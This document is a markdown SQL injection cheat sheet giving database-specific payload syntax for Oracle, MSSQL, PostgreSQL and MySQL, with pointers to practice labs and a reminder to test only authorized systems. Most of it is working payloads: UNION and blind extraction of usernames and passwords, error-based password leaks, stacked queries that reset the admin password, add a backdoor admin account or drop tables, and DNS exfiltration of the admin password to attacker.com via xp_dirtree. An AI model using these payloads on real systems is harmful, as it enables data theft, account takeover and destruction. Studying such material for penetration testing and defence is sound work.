# SQL Injection Cheat Sheet - Database Specific Syntax

A comprehensive reference for SQL injection syntax across different database systems.

---

## 🔍 String Concatenation

Combine multiple strings into a single string.

| Database | Syntax | Example |
|----------|--------|---------|
| **Oracle** | `'str1'\|\|'str2'` | `'foo'\|\|'bar'` → `'foobar'` |
| **MSSQL** | `'str1'+'str2'` | `'foo'+'bar'` → `'foobar'` |
| **PostgreSQL** | `'str1'\|\|'str2'` | `'foo'\|\|'bar'` → `'foobar'` |
| **MySQL** | `'str1' 'str2'`<br>`CONCAT('str1','str2')` | `'foo' 'bar'` → `'foobar'`<br>`CONCAT('foo','bar')` → `'foobar'` |

**Usage Example:**
```sql
-- Oracle/PostgreSQL
' UNION SELECT username||':'||password FROM users--

-- MSSQL
' UNION SELECT username+':'+password FROM users--

-- MySQL
' UNION SELECT CONCAT(username,':',password) FROM users--
```

---

## ✂️ Substring

Extract part of a string from a specified position.

| Database | Syntax | Example | Result |
|----------|--------|---------|--------|
| **Oracle** | `SUBSTR('string', start, length)` | `SUBSTR('foobar', 4, 2)` | `'ba'` |
| **MSSQL** | `SUBSTRING('string', start, length)` | `SUBSTRING('foobar', 4, 2)` | `'ba'` |
| **PostgreSQL** | `SUBSTRING('string', start, length)` | `SUBSTRING('foobar', 4, 2)` | `'ba'` |
| **MySQL** | `SUBSTRING('string', start, length)` | `SUBSTRING('foobar', 4, 2)` | `'ba'` |

**Note:** Offset index is 1-based (starts at 1, not 0)

**Blind SQLi Usage:**
```sql
-- Extract first character of password
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a'--
```

---

## 💬 Comments

Truncate queries and remove portions after your injection.

| Database | Comment Syntax | Notes |
|----------|---------------|-------|
| **Oracle** | `--comment` | Single-line |
| **MSSQL** | `--comment`<br>`/*comment*/` | Single-line<br>Multi-line |
| **PostgreSQL** | `--comment`<br>`/*comment*/` | Single-line<br>Multi-line |
| **MySQL** | `#comment`<br>`-- comment`<br>`/*comment*/` | Hash symbol<br>**Space after --**<br>Multi-line |

**Examples:**
```sql
-- Standard (works on most DBs)
' OR 1=1--

-- MySQL specific
' OR 1=1#
' OR 1=1-- 
/*     ^ space required */

-- Multi-line comment (all except Oracle)
' OR /*comment*/ 1=1/*comment*/
```

---

## 📊 Database Version

Determine the database type and version.

| Database | Query |
|----------|-------|
| **Oracle** | `SELECT banner FROM v$version`<br>`SELECT version FROM v$instance` |
| **MSSQL** | `SELECT @@version` |
| **PostgreSQL** | `SELECT version()` |
| **MySQL** | `SELECT @@version` |

**UNION Attack Examples:**
```sql
-- MSSQL/MySQL
' UNION SELECT @@version--

-- PostgreSQL
' UNION SELECT version()--

-- Oracle
' UNION SELECT banner FROM v$version--
```

**Blind SQLi Example:**
```sql
-- Test if MSSQL
' AND @@version LIKE '%Microsoft%'--
```

---

## 📚 Database Contents

List tables and columns in the database.

### List All Tables

| Database | Query |
|----------|-------|
| **Oracle** | `SELECT * FROM all_tables` |
| **MSSQL** | `SELECT * FROM information_schema.tables` |
| **PostgreSQL** | `SELECT * FROM information_schema.tables` |
| **MySQL** | `SELECT * FROM information_schema.tables` |

### List Columns in a Table

| Database | Query |
|----------|-------|
| **Oracle** | `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'` |
| **MSSQL** | `SELECT * FROM information_schema.columns WHERE table_name = 'users'` |
| **PostgreSQL** | `SELECT * FROM information_schema.columns WHERE table_name = 'users'` |
| **MySQL** | `SELECT * FROM information_schema.columns WHERE table_name = 'users'` |

**Note:** Oracle table names are typically uppercase.

**Example Attack:**
```sql
-- Step 1: List tables
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- Step 2: List columns
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Step 3: Extract data
' UNION SELECT username,password FROM users--
```

---

## ⚠️ Conditional Errors

Trigger database errors based on a condition.

| Database | Syntax |
|----------|--------|
| **Oracle** | `SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| **MSSQL** | `SELECT CASE WHEN (condition) THEN 1/0 ELSE NULL END` |
| **PostgreSQL** | `1 = (SELECT CASE WHEN (condition) THEN 1/(SELECT 0) ELSE NULL END)` |
| **MySQL** | `SELECT IF(condition,(SELECT table_name FROM information_schema.tables),'a')` |

**Usage Example (Blind SQLi):**
```sql
-- MSSQL: Test if admin password starts with 'a'
' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN 1/0 ELSE 'a' END)='a'--
```

---

## 💥 Error-Based Data Extraction

Extract data through visible error messages.

| Database | Technique |
|----------|-----------|
| **MSSQL** | `SELECT 'foo' WHERE 1 = (SELECT 'secret')`<br>→ `Conversion failed when converting the varchar value 'secret' to data type int.` |
| **PostgreSQL** | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`<br>→ `invalid input syntax for integer: "secret"` |
| **MySQL** | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`<br>→ `XPATH syntax error: '\secret'` |

**Example:**
```sql
-- PostgreSQL: Extract admin password via error
' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS int)--

-- Error message reveals: invalid input syntax for integer: "p@ssw0rd123"
```

---

## 🔄 Batched (Stacked) Queries

Execute multiple queries in succession.

| Database | Support | Syntax |
|----------|---------|--------|
| **Oracle** | ❌ No | N/A |
| **MSSQL** | ✅ Yes | `QUERY-1; QUERY-2`<br>`QUERY-1 QUERY-2` |
| **PostgreSQL** | ✅ Yes | `QUERY-1; QUERY-2` |
| **MySQL** | ⚠️ Limited | `QUERY-1; QUERY-2` (depends on API) |

**Note:** MySQL batched queries typically don't work for SQLi, but may work with certain PHP/Python APIs.

**Example:**
```sql
-- MSSQL: Update admin password
'; UPDATE users SET password='hacked' WHERE username='admin'--

-- PostgreSQL: Create backdoor account
'; INSERT INTO users (username, password, role) VALUES ('hacker', 'pass123', 'admin')--
```

---

## ⏰ Time Delays

Cause unconditional time delays (10 seconds).

| Database | Syntax |
|----------|--------|
| **Oracle** | `dbms_pipe.receive_message(('a'),10)` |
| **MSSQL** | `WAITFOR DELAY '0:0:10'` |
| **PostgreSQL** | `SELECT pg_sleep(10)` |
| **MySQL** | `SELECT SLEEP(10)` |

**Example:**
```sql
-- MSSQL
' WAITFOR DELAY '0:0:10'--

-- MySQL
' AND SLEEP(10)--

-- PostgreSQL
' AND (SELECT pg_sleep(10))--
```

---

## ⏱️ Conditional Time Delays

Trigger time delay only if condition is TRUE (blind SQLi).

| Database | Syntax |
|----------|--------|
| **Oracle** | `SELECT CASE WHEN (condition) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| **MSSQL** | `IF (condition) WAITFOR DELAY '0:0:10'` |
| **PostgreSQL** | `SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| **MySQL** | `SELECT IF(condition,SLEEP(10),'a')` |

**Blind SQLi Example:**
```sql
-- MSSQL: Test if admin password starts with 'a'
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' WAITFOR DELAY '0:0:10'--

-- If delay occurs → first character is 'a'
-- If no delay → first character is not 'a'
```

---

## 🌐 DNS Lookup (Out-of-Band)

Trigger DNS lookups to an external domain you control.

### Basic DNS Lookup

| Database | Syntax |
|----------|--------|
| **Oracle** | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`<br><br>Or (requires privileges):<br>`SELECT UTL_INADDR.get_host_address('COLLABORATOR-SUBDOMAIN')` |
| **MSSQL** | `exec master..xp_dirtree '//COLLABORATOR-SUBDOMAIN/a'` |
| **PostgreSQL** | `copy (SELECT '') to program 'nslookup COLLABORATOR-SUBDOMAIN'` |
| **MySQL** | `LOAD_FILE('\\\\COLLABORATOR-SUBDOMAIN\\a')`<br>`SELECT ... INTO OUTFILE '\\\\COLLABORATOR-SUBDOMAIN\a'`<br>**(Windows only)** |

### DNS Lookup with Data Exfiltration

| Database | Syntax |
|----------|--------|
| **Oracle** | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` |
| **MSSQL** | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.COLLABORATOR-SUBDOMAIN/a"')` |
| **PostgreSQL** | Complex function creation (see full syntax in document) |
| **MySQL** | `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\COLLABORATOR-SUBDOMAIN\a'`<br>**(Windows only)** |

**Example (MSSQL):**
```sql
-- Basic DNS lookup
'; exec master..xp_dirtree '//attacker.com/a'--

-- Exfiltrate admin password via DNS
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='admin');
exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--

-- DNS query will be: p@ssw0rd123.attacker.com
```

---

## 🎯 Database-Specific Quirks

### Oracle

1. **Requires FROM clause:**
```sql
-- Wrong
' UNION SELECT 'test'--

-- Correct
' UNION SELECT 'test' FROM dual--
```

2. **Table names are uppercase:**
```sql
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'  -- Correct
SELECT * FROM all_tab_columns WHERE table_name = 'users'  -- Won't find anything
```

### MySQL

1. **Comment requires space:**
```sql
' OR 1=1--     ❌ Won't work
' OR 1=1-- '   ✅ Works (space after --)
' OR 1=1#      ✅ Works (alternative)
```

2. **Multiple comment styles:**
```sql
#comment
-- comment (space required)
/*comment*/
```

### MSSQL

1. **String concatenation:**
```sql
'str1'+'str2'  -- Not 'str1'||'str2'
```

2. **Batched queries supported:**
```sql
'; DROP TABLE users--  -- Works!
```

### PostgreSQL

1. **Case sensitive:**
```sql
SELECT * FROM Users   -- Error if table is 'users'
SELECT * FROM users   -- Correct
```

2. **Cast for error extraction:**
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

---

## 🛡️ Quick Reference Table

| Task | Oracle | MSSQL | PostgreSQL | MySQL |
|------|--------|-------|------------|-------|
| **Concat** | `\|\|` | `+` | `\|\|` | `CONCAT()` or space |
| **Substring** | `SUBSTR()` | `SUBSTRING()` | `SUBSTRING()` | `SUBSTRING()` |
| **Comment** | `--` | `--`, `/* */` | `--`, `/* */` | `#`, `-- `, `/* */` |
| **Version** | `SELECT banner FROM v$version` | `SELECT @@version` | `SELECT version()` | `SELECT @@version` |
| **Time Delay** | `dbms_pipe.receive_message()` | `WAITFOR DELAY` | `pg_sleep()` | `SLEEP()` |
| **Stacked Queries** | ❌ | ✅ | ✅ | ⚠️ |
| **FROM Required** | ✅ (use `dual`) | ❌ | ❌ | ❌ |

---

## 💡 Pro Tips

1. **Always identify the database first** using version queries or error messages
2. **Use NULL for column counting** – it's compatible with all data types
3. **Oracle requires FROM dual** for most queries
4. **MySQL comments need a space** after `--`
5. **MSSQL allows stacked queries** – very powerful
6. **PostgreSQL has strong type enforcement** – use CAST for errors
7. **Out-of-band is stealthy** but requires external infrastructure

---

## 🎓 Practice Resources

- **PortSwigger Web Security Academy** - Free labs for each technique
- **DVWA** - Damn Vulnerable Web Application
- **SQLi-Labs** - Dedicated SQL injection practice
- **HackTheBox** - Real-world scenarios

---

**Remember: Only test on authorized systems!**

## 📖 Additional Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
